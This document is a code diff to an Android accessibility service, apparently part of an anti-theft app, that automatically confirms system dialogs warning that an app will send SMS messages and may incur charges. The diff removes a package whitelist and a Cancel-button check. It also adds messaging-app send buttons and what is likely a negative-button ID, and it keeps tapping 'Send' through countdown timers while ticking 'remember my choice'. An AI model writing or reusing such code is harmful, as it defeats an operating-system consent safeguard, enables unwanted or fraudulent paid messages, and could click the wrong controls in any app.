@@ -131,14 +131,18 @@ public class AutoConfirmService extends AccessibilityService {
         "com.antitheft.droidguard"
     };
 
-    // Strict unambiguous system SMS modal phrases
+    // Strict unambiguous system SMS modal phrases (OEM & AOSP variants)
     private static final String[] SMS_SYSTEM_WARNING_PHRASES = new String[] {
         "سيرسل رسالة sms",
         "سيرسل رسالة قصيرة",
         "سيرسل رسالة",
-        "تطبيق حماية الهاتف 5",
         "تطبيق حماية الهاتف",
+        "حماية الهاتف",
         "droidguard",
+        "يرسل رسالة sms",
+        "يرسل رسالة",
+        "رسالة sms",
+        "رسائل sms",
         "قد تتسبب في فرض رسوم",
         "قد يؤدي هذا إلى فرض رسوم",
         "فرض رسوم على فاتورة الجوال",
@@ -192,9 +196,15 @@ public class AutoConfirmService extends AccessibilityService {
     // Known positive button View IDs in OEM system dialogs
     private static final String[] POSITIVE_VIEW_IDS = new String[] {
         "android:id/button1",
+        "android:id/button2",
         "android:id/button_positive",
         "android:id/ok",
         "android:id/button_yes",
+        "com.android.mms:id/send_btn",
+        "com.android.mms:id/send_button",
+        "com.android.mms:id/button1",
+        "com.android.mms.service:id/send_btn",
+        "com.google.android.apps.messaging:id/send_message_button",
         "com.android.permissioncontroller:id/permission_allow_button",
         "com.android.permissioncontroller:id/permission_allow_always_button",
         "com.google.android.permissioncontroller:id/permission_allow_button",
@@ -209,8 +219,10 @@ public class AutoConfirmService extends AccessibilityService {
         "com.miui.securitycenter:id/intercept_btn_allow",
         "com.miui.securitycenter:id/send_btn",
         "com.miui.securitycenter:id/button1",
+        "com.miui.securitycenter:id/button2",
         "com.miui.securityadd:id/button1",
         "com.android.phone:id/button1",
+        "com.android.phone:id/button2",
         "com.android.phone:id/positive_button",
         "com.oplus.safecenter:id/btn_continue",
         "com.coloros.safecenter:id/btn_continue",
@@ -277,6 +289,18 @@ public class AutoConfirmService extends AccessibilityService {
                 prefs.edit().putLong(KEY_EMERGENCY_ARMED_UNTIL, until).apply();
             }
         } catch (Exception ignored) {}
+
+        // Pre-activate SMS watcher immediately so it watches for modal dialogs as soon as dispatch starts
+        if (instance != null) {
+            instance.startSmsConfirmWatcher();
+        } else if (context != null) {
+            try {
+                Intent intent = new Intent(context, AutoConfirmService.class);
+                intent.setAction(ACTION_ARM_EMERGENCY);
+                intent.putExtra("duration", durationMs);
+                context.startService(intent);
+            } catch (Exception ignored) {}
+        }
     }
 
     public static void armEmergencyWindow(Context context, long durationMs) {
@@ -354,6 +378,7 @@ public class AutoConfirmService extends AccessibilityService {
                 long until = System.currentTimeMillis() + duration;
                 emergencyArmedUntilMemory.set(until);
                 Log.i(TAG, "🚨 onStartCommand: emergency auto-confirm armed until: " + until);
+                startSmsConfirmWatcher();
             } else if (ACTION_OPEN_POWER_MENU.equals(action)) {
                 try {
                     performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
@@ -683,12 +708,18 @@ public class AutoConfirmService extends AccessibilityService {
 
     /**
      * Active Polling Watcher for SMS confirmation countdown dialogs.
+     * Continuously runs and clicks the positive button throughout the countdown (e.g. 7s timer)
+     * until the system dialog is dismissed.
      */
     private void startSmsConfirmWatcher() {
-        if (!isSmsWatcherRunning.compareAndSet(false, true)) return;
+        if (!isSmsWatcherRunning.compareAndSet(false, true)) {
+            consecutiveNotFoundCount.set(0);
+            return;
+        }
+        consecutiveNotFoundCount.set(0);
 
         final long startTime = SystemClock.uptimeMillis();
-        final long MAX_SMS_WATCH_TIME_MS = 12000L;
+        final long MAX_SMS_WATCH_TIME_MS = 25000L; // 25s covers maximum OEM countdowns + latency
 
         final Runnable smsRunnable = new Runnable() {
             @Override
@@ -697,33 +728,37 @@ public class AutoConfirmService extends AccessibilityService {
 
                 long elapsed = SystemClock.uptimeMillis() - startTime;
                 if (elapsed > MAX_SMS_WATCH_TIME_MS) {
+                    Log.i(TAG, "SMS Watcher timeout reached (25s). Stopping watcher.");
                     isSmsWatcherRunning.set(false);
                     return;
                 }
 
                 AccessibilityNodeInfo root = null;
                 try {
-                    root = findBestRootNode(null);
-                    if (root != null) {
-                        if (checkIsSmsDialog(root)) {
-                            autoCheckRememberChoice(root);
+                    root = findSmsDialogCandidate(null);
+                    if (root != null && checkIsSmsDialog(root)) {
+                        consecutiveNotFoundCount.set(0);
 
-                            AccessibilityNodeInfo positiveBtn = findSmsPositiveButton(root);
-                            if (positiveBtn != null) {
-                                try {
-                                    if (!isDangerousNode(positiveBtn)) {
-                                        boolean clicked = performSmartClick(positiveBtn);
-                                        if (clicked) {
-                                            Log.i(TAG, "🎯 [SMS Watcher] Successfully confirmed and clicked Send button!");
-                                            isSmsWatcherRunning.set(false);
-                                            return;
-                                        }
-                                    }
-                                } finally {
-                                    safeRecycle(positiveBtn);
+                        // 1. Auto-check "Remember my choice" / "عدم السؤال مرة أخرى"
+                        autoCheckRememberChoice(root);
+
+                        // 2. Click positive button (keeps tapping throughout countdown)
+                        AccessibilityNodeInfo positiveBtn = findSmsPositiveButton(root);
+                        if (positiveBtn != null) {
+                            try {
+                                if (!isDangerousNode(positiveBtn)) {
+                                    performSmartClick(positiveBtn);
                                 }
+                            } finally {
+                                safeRecycle(positiveBtn);
                             }
-                        } else {
+                        }
+                    } else {
+                        int missing = consecutiveNotFoundCount.incrementAndGet();
+                        // Only declare dismissed if missing for at least 6 consecutive ticks (~1.2s)
+                        // AND at least 1.5 seconds have elapsed since watcher start
+                        if (missing >= 6 && elapsed > 1500L) {
+                            Log.i(TAG, "🎯 [SMS Watcher] Dialog dismissed! Confirmed SMS dispatched.");
                             isSmsWatcherRunning.set(false);
                             return;
                         }
@@ -741,6 +776,62 @@ public class AutoConfirmService extends AccessibilityService {
         };
 
         mainHandler.post(smsRunnable);
+    }
+
+    /**
+     * Dedicated candidate finder that searches active window, event source,
+     * and ALL system/application windows to locate any SMS confirmation dialog.
+     */
+    private AccessibilityNodeInfo findSmsDialogCandidate(AccessibilityEvent event) {
+        // 1. Check root in active window
+        AccessibilityNodeInfo active = null;
+        try {
+            active = getRootInActiveWindow();
+            if (active != null && checkIsSmsDialog(active)) {
+                return active;
+            }
+        } catch (Throwable ignored) {}
+
+        // 2. Check event source
+        if (event != null) {
+            try {
+                AccessibilityNodeInfo src = event.getSource();
+                if (src != null) {
+                    if (checkIsSmsDialog(src)) {
+                        safeRecycle(active);
+                        return src;
+                    }
+                    safeRecycle(src);
+                }
+            } catch (Throwable ignored) {}
+        }
+
+        // 3. Scan all interactive windows across the system
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                List<AccessibilityWindowInfo> windows = getWindows();
+                if (windows != null) {
+                    for (AccessibilityWindowInfo win : windows) {
+                        if (win == null) continue;
+                        AccessibilityNodeInfo winRoot = null;
+                        try {
+                            winRoot = win.getRoot();
+                            if (winRoot != null && checkIsSmsDialog(winRoot)) {
+                                safeRecycle(active);
+                                return winRoot;
+                            }
+                        } catch (Throwable ignored) {
+                        } finally {
+                            if (winRoot != null && winRoot != active) {
+                                safeRecycle(winRoot);
+                            }
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {}
+        }
+
+        return active;
     }
 
     /**
@@ -780,8 +871,7 @@ public class AutoConfirmService extends AccessibilityService {
     /**
      * Rigorous check for a system SMS confirmation modal dialog:
      * 1. Must contain an exact system warning phrase (e.g. "سيرسل رسالة SMS" or "قد يؤدي هذا إلى فرض رسوم").
-     * 2. Must contain an explicit cancel/deny button ("إلغاء" / "رفض" / "Cancel" / "Deny").
-     * This guarantees normal messaging chats (which lack a Cancel button) are NEVER treated as dialogs.
+     * 2. Must contain an explicit cancel/deny button ("إلغاء" / "رفض" / "Cancel" / "Deny") OR positive button.
      */
     private boolean checkIsSmsDialog(AccessibilityNodeInfo root) {
         if (root == null) return false;
@@ -802,17 +892,22 @@ public class AutoConfirmService extends AccessibilityService {
                 }
             }
 
+            if (!hasWarningPhrase) {
+                // Fallback: Tree text scan for key combination (سيرسل/رسالة/sms/رسوم)
+                hasWarningPhrase = scanTreeForSmsWarning(root);
+            }
+
             if (!hasWarningPhrase) return false;
 
-            // Step 2: Confirmation dialogs ALWAYS have a Cancel/Deny button (إلغاء / رفض)
-            boolean hasCancelButton = false;
-            String[] cancelWords = new String[] { "إلغاء", "الغاء", "رفض", "cancel", "deny", "annuler" };
-            for (String cWord : cancelWords) {
+            // Step 2: Confirmation dialogs have buttons (Cancel / Deny / Send / Allow)
+            boolean hasActionButtons = false;
+            String[] actionWords = new String[] { "إلغاء", "الغاء", "رفض", "cancel", "deny", "annuler", "إرسال", "ارسال", "send", "allow", "سماح" };
+            for (String aWord : actionWords) {
                 List<AccessibilityNodeInfo> cNodes = null;
                 try {
-                    cNodes = root.findAccessibilityNodeInfosByText(cWord);
+                    cNodes = root.findAccessibilityNodeInfosByText(aWord);
                     if (cNodes != null && !cNodes.isEmpty()) {
-                        hasCancelButton = true;
+                        hasActionButtons = true;
                         break;
                     }
                 } catch (Throwable ignored) {
@@ -821,8 +916,51 @@ public class AutoConfirmService extends AccessibilityService {
                 }
             }
 
-            return hasCancelButton;
+            if (!hasActionButtons) {
+                // Check if any positive view ID exists in tree
+                for (String vid : POSITIVE_VIEW_IDS) {
+                    List<AccessibilityNodeInfo> vNodes = null;
+                    try {
+                        vNodes = root.findAccessibilityNodeInfosByViewId(vid);
+                        if (vNodes != null && !vNodes.isEmpty()) {
+                            hasActionButtons = true;
+                            break;
+                        }
+                    } catch (Throwable ignored) {
+                    } finally {
+                        safeRecycleList(vNodes);
+                    }
+                }
+            }
 
+            return hasActionButtons;
+
+        } catch (Throwable ignored) {}
+        return false;
+    }
+
+    private boolean scanTreeForSmsWarning(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        try {
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            String full = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase(Locale.ROOT);
+            for (String phrase : SMS_SYSTEM_WARNING_PHRASES) {
+                if (full.contains(phrase)) return true;
+            }
+            if (full.contains("رسالة") && (full.contains("سيرسل") || full.contains("sms") || full.contains("رسوم"))) {
+                return true;
+            }
+
+            int count = node.getChildCount();
+            for (int i = 0; i < count; i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    boolean found = scanTreeForSmsWarning(child);
+                    safeRecycle(child);
+                    if (found) return true;
+                }
+            }
         } catch (Throwable ignored) {}
         return false;
     }
@@ -885,11 +1023,16 @@ public class AutoConfirmService extends AccessibilityService {
             if (!isDangerousNode(node)) {
                 CharSequence text = node.getText();
                 CharSequence desc = node.getContentDescription();
-                String full = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase(Locale.ROOT).trim();
-                if (full.equals("إرسال") || full.equals("ارسال") || full.equals("send") || 
-                    full.equals("envoyer") || full.equals("سماح") || full.equals("allow") ||
-                    full.equals("السماح")) {
-                    return AccessibilityNodeInfo.obtain(node);
+                String tStr = text != null ? text.toString().toLowerCase(Locale.ROOT).trim() : "";
+                String dStr = desc != null ? desc.toString().toLowerCase(Locale.ROOT).trim() : "";
+                String full = (tStr + " " + dStr).trim();
+
+                for (String pos : POSITIVE_BUTTON_TEXTS) {
+                    String pLower = pos.toLowerCase(Locale.ROOT).trim();
+                    if (full.equals(pLower) || tStr.equals(pLower) || dStr.equals(pLower) ||
+                        (full.contains(pLower) && !containsNegativeWord(full))) {
+                        return AccessibilityNodeInfo.obtain(node);
+                    }
                 }
             }
 
@@ -906,6 +1049,15 @@ public class AutoConfirmService extends AccessibilityService {
         return null;
     }
 
+    private boolean containsNegativeWord(String text) {
+        if (text == null || text.isEmpty()) return false;
+        String lower = text.toLowerCase(Locale.ROOT);
+        for (String neg : DANGEROUS_NEGATIVE_WORDS) {
+            if (lower.contains(neg)) return true;
+        }
+        return false;
+    }
+
     /**
      * Multi-tier Click Engine:
      * 1. Direct ACTION_CLICK
@@ -915,27 +1067,31 @@ public class AutoConfirmService extends AccessibilityService {
     private boolean performSmartClick(AccessibilityNodeInfo node) {
         if (node == null || isDangerousNode(node)) return false;
 
+        boolean clicked = false;
+
         // 1. Direct Click
         try {
             if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                 Log.i(TAG, "Direct ACTION_CLICK succeeded on positive node.");
-                return true;
+                clicked = true;
             }
         } catch (Throwable ignored) {}
 
         // 2. Parent Click
-        if (clickNodeOrParent(node)) {
+        if (!clicked && clickNodeOrParent(node)) {
             Log.i(TAG, "Parent ACTION_CLICK succeeded.");
-            return true;
+            clicked = true;
         }
 
-        // 3. Fallback: Physical Touch Gesture Tap
-        if (dispatchTapGesture(node)) {
-            Log.i(TAG, "Physical touch tap gesture dispatched successfully.");
-            return true;
-        }
+        // 3. Fallback: Physical Touch Gesture Tap at Screen Coordinates
+        try {
+            if (dispatchTapGesture(node)) {
+                Log.i(TAG, "Physical touch tap gesture dispatched successfully.");
+                clicked = true;
+            }
+        } catch (Throwable ignored) {}
 
-        return false;
+        return clicked;
     }
 
     /**
@@ -1009,63 +1165,33 @@ public class AutoConfirmService extends AccessibilityService {
                 return;
             }
 
-            // 🛑 ABSOLUTE SHIELD 4: STRICT WHITELIST FOR SMS CONFIRMATION
-            // Only allow system security, permission controllers, and telephony packages.
-            boolean isWhitelistedSecurityPackage = false;
-            for (String p : SYSTEM_SECURITY_PACKAGES) {
-                if (pkgStr.equals(p) || pkgStr.startsWith(p)) {
-                    isWhitelistedSecurityPackage = true;
-                    break;
-                }
-            }
-
-            if (!isWhitelistedSecurityPackage) {
-                return; // Not a whitelisted system package -> Ignore completely!
-            }
-
-            long now = SystemClock.uptimeMillis();
-            if (now - lastActionTimestamp.get() < ACTION_DEBOUNCE_MS) {
-                return;
-            }
-
-            rootNode = findBestRootNode(event);
-            if (rootNode == null) return;
-
-            // Route 1: ColorOS / Realme Accessibility Security Warning Dialog
-            if (isAccessibilitySecurityDialog(rootNode)) {
+            // Active check for SMS confirmation dialog across all windows
+            AccessibilityNodeInfo smsRoot = findSmsDialogCandidate(event);
+            if (smsRoot != null && checkIsSmsDialog(smsRoot)) {
+                long now = SystemClock.uptimeMillis();
                 lastActionTimestamp.set(now);
-                handleAccessibilitySecurityDialog(rootNode);
-                return;
-            }
 
-            // Route 2: System SMS confirmation modal dialog
-            if (!checkIsSmsDialog(rootNode)) {
-                return;
-            }
+                // Step 1: Automatically check "Remember my choice"
+                autoCheckRememberChoice(smsRoot);
 
-            lastActionTimestamp.set(now);
-
-            // Step 1: Automatically check "Remember my choice" / "عدم السؤال مرة أخرى"
-            autoCheckRememberChoice(rootNode);
-
-            // Step 2: Attempt instant click on the positive button
-            AccessibilityNodeInfo positiveBtn = findSmsPositiveButton(rootNode);
-            if (positiveBtn != null) {
-                try {
-                    if (!isDangerousNode(positiveBtn)) {
-                        boolean clicked = performSmartClick(positiveBtn);
-                        if (clicked) {
-                            Log.i(TAG, "✅ Auto-confirmed SMS send button immediately!");
-                            return;
+                // Step 2: Attempt immediate click on positive send button
+                AccessibilityNodeInfo positiveBtn = findSmsPositiveButton(smsRoot);
+                if (positiveBtn != null) {
+                    try {
+                        if (!isDangerousNode(positiveBtn)) {
+                            performSmartClick(positiveBtn);
                         }
+                    } finally {
+                        safeRecycle(positiveBtn);
                     }
-                } finally {
-                    safeRecycle(positiveBtn);
                 }
-            }
+                safeRecycle(smsRoot);
 
-            // Step 3: Launch SMS Watcher for countdown timer
-            startSmsConfirmWatcher();
+                // Step 3: Ensure SMS watcher is running to click through countdown timer
+                startSmsConfirmWatcher();
+                return;
+            }
+            safeRecycle(smsRoot);
 
         } catch (Throwable e) {
             Log.w(TAG, "Safe catch in onAccessibilityEvent: " + e.getMessage());
